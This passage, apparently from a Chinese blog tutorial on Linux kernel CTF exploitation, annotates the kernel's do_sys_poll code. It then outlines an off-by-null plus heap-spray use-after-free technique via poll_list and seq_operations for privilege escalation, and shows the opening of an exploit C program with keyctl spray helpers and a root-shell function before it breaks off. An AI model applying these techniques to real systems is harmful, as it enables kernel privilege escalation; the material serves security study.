class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> POLL_STACK_ALLOC	256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="comment">//(4096-16)/8 = 510(堆上存放pollfd最大数量)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POLLFD_PER_PAGE  ((PAGE_SIZE-sizeof(struct poll_list)) / sizeof(struct pollfd))	</span></span><br><span class="line"><span class="comment">//(256-16)/8 = 30 (栈上存放pollfd最大数量)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_STACK_PPS ((sizeof(stack_pps) - sizeof(struct poll_list))  / sizeof(struct pollfd))</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_sys_poll</span><span class="params">(<span class="keyword">struct</span> pollfd __user *ufds, <span class="type">unsigned</span> <span class="type">int</span> nfds,</span></span><br><span class="line"><span class="params">		<span class="keyword">struct</span> timespec64 *end_time)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">poll_wqueues</span> <span class="title">table</span>;</span></span><br><span class="line">    <span class="type">int</span> err = -EFAULT, fdcount, len;</span><br><span class="line">    <span class="comment">/* Allocate small arguments on the stack to save memory and be</span></span><br><span class="line"><span class="comment">       faster - use long to make sure the buffer is aligned properly</span></span><br><span class="line"><span class="comment">       on 64 bit archs to avoid unaligned access */</span></span><br><span class="line">                </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *  [1] stack_pps 256 字节的栈缓冲区, 负责存储前 30 个 pollfd entry</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="type">long</span> stack_pps[POLL_STACK_ALLOC/<span class="keyword">sizeof</span>(<span class="type">long</span>)]; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> *<span class="title">const</span> <span class="title">head</span> =</span> (<span class="keyword">struct</span> poll_list *)stack_pps;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> *<span class="title">walk</span> =</span> head;</span><br><span class="line"> 	<span class="type">unsigned</span> <span class="type">long</span> todo = nfds;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nfds &gt; rlimit(RLIMIT_NOFILE))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	*  [2] 前30个 pollfd entry 先存放在栈上，节省内存和时间</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	len = <span class="type">min_t</span>(<span class="type">unsigned</span> <span class="type">int</span>, nfds, N_STACK_PPS);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		walk-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">		walk-&gt;len = len;</span><br><span class="line">		<span class="keyword">if</span> (!len)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(walk-&gt;entries, ufds + nfds-todo, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pollfd) * walk-&gt;len))</span><br><span class="line">			<span class="keyword">goto</span> out_fds;</span><br><span class="line"></span><br><span class="line">		todo -= walk-&gt;len;</span><br><span class="line">		<span class="keyword">if</span> (!todo)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 	[3] 如果提交超过30个 pollfd entries，就会把多出来的 pollfd 放在内核堆上。</span></span><br><span class="line"><span class="comment">        * 	每个 page 最多存 POLLFD_PER_PAGE (510) 个entry, </span></span><br><span class="line"><span class="comment">        * 	超过这个数，则分配新的 poll_list, 依次循环直到存下所有传入的 entry</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">		len = min(todo, POLLFD_PER_PAGE);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        *   [4] 只要控制好被监控的文件描述符数量，就能控制分配size，从 kmalloc-32 到 kmalloc-4k</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">		walk = walk-&gt;next = kmalloc(struct_size(walk, entries, len), GFP_KERNEL); 			</span><br><span class="line">		<span class="keyword">if</span> (!walk) &#123;</span><br><span class="line">			err = -ENOMEM;</span><br><span class="line">			<span class="keyword">goto</span> out_fds;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	poll_initwait(&amp;table);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * 	[5] 分配完 poll_list 对象后，调用 do_poll() 来监控这些文件描述符，直到发生特定 event 或者超时。</span></span><br><span class="line"><span class="comment">    *   这里 end_time 就是最初传给 poll() 的超时变量, 这表示 poll_list 对象可以在内存中保存任意时长，超时后自动释放。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	fdcount = do_poll(head, &amp;table, end_time);  </span><br><span class="line">	poll_freewait(&amp;table);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!user_write_access_begin(ufds, nfds * <span class="keyword">sizeof</span>(*ufds))and)</span><br><span class="line">		<span class="keyword">goto</span> out_fds;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (walk = head; walk; walk = walk-&gt;next) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> *<span class="title">fds</span> =</span> walk-&gt;entries;</span><br><span class="line">		<span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (j = walk-&gt;len; j; fds++, ufds++, j--)</span><br><span class="line">			unsafe_put_user(fds-&gt;revents, &amp;ufds-&gt;revents, Efault);</span><br><span class="line">  	&#125;</span><br><span class="line">	user_write_access_end();</span><br><span class="line"></span><br><span class="line">	err = fdcount;</span><br><span class="line">out_fds:</span><br><span class="line">	walk = head-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (walk) &#123; 		<span class="comment">// [6] 释放 poll_list: 遍历单链表, 释放每一个 poll_list, 这里可以利用</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> *<span class="title">pos</span> =</span> walk;</span><br><span class="line">		walk = walk-&gt;next;</span><br><span class="line">		kfree(pos);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">Efault:</span><br><span class="line">	user_write_access_end();</span><br><span class="line">	err = -EFAULT;</span><br><span class="line">	<span class="keyword">goto</span> out_fds;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们可以去找到一些结构体，其头 <code>8</code> 字节是一个指针，然后利用 <code>off by null</code> 去损坏该指针，比如使得 <code>0xXXXXa0</code> 变成 <code>0xXXXX00</code>，然后就可以考虑利用堆喷去构造 <code>UAF</code> 了。</p>
<p><strong>详细流程</strong></p>
<ol>
<li><p>首先分配 <code>kmalloc-4096</code> 大小的结构题在<code>ptr[0]</code>；</p>
</li>
<li><p>然后构造这样的<code>poll_list</code>结构体。</p>
</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/99a7506313bfd15e5f0821cc7486cfb9.png"
                      alt="99a7506313bfd15e5f0821cc7486cfb9"
                ></p>
<ol start="3">
<li><p>利用<code>off-by-null</code>将<code>poll_list-&gt;next</code>的最后一个字节改为空。然后大量分配<code>kmalloc-32</code>的<code>obj</code>内存，这里只所以是 <code>32</code> 字节大小是因为要与后面的 <code>seq_operations</code> 配合，并且 <code>32</code> 大小的 <code>object</code> 其低字节是可能为 <code>\x00</code> 的，其低字节为 <code>0x20</code>、<code>0x40</code>、<code>0x80</code> 、<code>0xa0</code>、<code>0xc0</code>、<code>0xe0</code>、<code>0x00</code>。运气好可以被我们篡改后的<code>poll_list-&gt;next</code>指到。但对于这道题来说我们没有足够的堆块用于堆喷，所以成功率是极低的。	<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/64bfe90cc041bac53218ddde26656a27.png"
                      alt="64bfe90cc041bac53218ddde26656a27"
                ></p>
</li>
<li><p>等待<code>poll_list</code>线程执行完毕，并且我们分配的<code>kmalloc-32</code>被错误释放，分配大量的<code>seq_operations</code>，运气好可以正好被分配到我们释放的<code>kmalloc-32</code>，形成<code>UAF</code>，这样我们就可以利用<code>UAF</code>修改<code>seq_operations-&gt;start</code>指针指向提权代码。</p>
</li>
<li><p>提权可以参考上一篇文章，利用栈上的残留值来<code>bypass kaslr</code>。</p>
</li>
</ol>
<h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sysinfo.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_MALLOC 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_FREE 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_EDIT 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_READ 9</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEQ_NUM (2048 + 128)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_NUM 72</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_NUM 199</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line"><span class="type">int</span> bof_fd;</span><br><span class="line"><span class="type">int</span> key_id[KEY_NUM];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_STACK_PPS 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POLL_NUM 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;        <span class="comment">// 内容长度</span></span><br><span class="line">    <span class="type">char</span> *buf;         <span class="comment">// 用户态缓冲区地址</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx; <span class="comment">// 表示 ptr 数组的 索引</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------------------------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __aligned(x)                    __attribute__((__aligned__(x)))</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> u64;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU destructor */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> datalen;    <span class="comment">/* length of this data */</span></span><br><span class="line">    <span class="type">char</span> data[<span class="number">0</span>] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_alloc</span><span class="params">(<span class="type">int</span> id, <span class="type">void</span> *payload, <span class="type">int</span> payload_len)</span> &#123;</span><br><span class="line">    <span class="type">char</span> description[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">    <span class="built_in">sprintf</span>(description, <span class="string">&quot;pwn_%d&quot;</span>, id);</span><br><span class="line">    <span class="keyword">return</span> key_id[id] = syscall(__NR_add_key, <span class="string">&quot;user&quot;</span>, description, payload, payload_len - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> user_key_payload), KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_update</span><span class="params">(<span class="type">int</span> id, <span class="type">void</span> *payload, <span class="type">size_t</span> plen)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UPDATE, key_id[id], payload, plen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_read</span><span class="params">(<span class="type">int</span> id, <span class="type">void</span> *bufer, <span class="type">size_t</span> buflen)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_READ, key_id[id], bufer, buflen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_revoke</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, key_id[id], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_unlink</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UNLINK, key_id[id], KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------------------------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> tid[<span class="number">40</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> nfds, timer;</span><br><span class="line">&#125; poll_args;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">poll_list</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">entries</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span 